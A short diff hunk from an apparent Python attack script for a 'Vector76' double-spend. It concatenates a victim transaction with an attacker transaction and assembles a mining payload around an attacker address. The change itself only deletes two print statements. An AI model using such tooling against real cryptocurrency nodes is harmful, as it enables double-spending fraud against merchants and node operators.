@@ -93,8 +93,6 @@ print()
 print()
 tx_vector76 = f"{tx_victim}{tx_attacker}"
 print(tx_vector76)
-print("sending vector76 block Your Node...")
-print(result)
 print("Mining Vector76 Block...")
 payload = [attacker_address, [tx_vector76], False]
 print(f"Payload : {payload}")
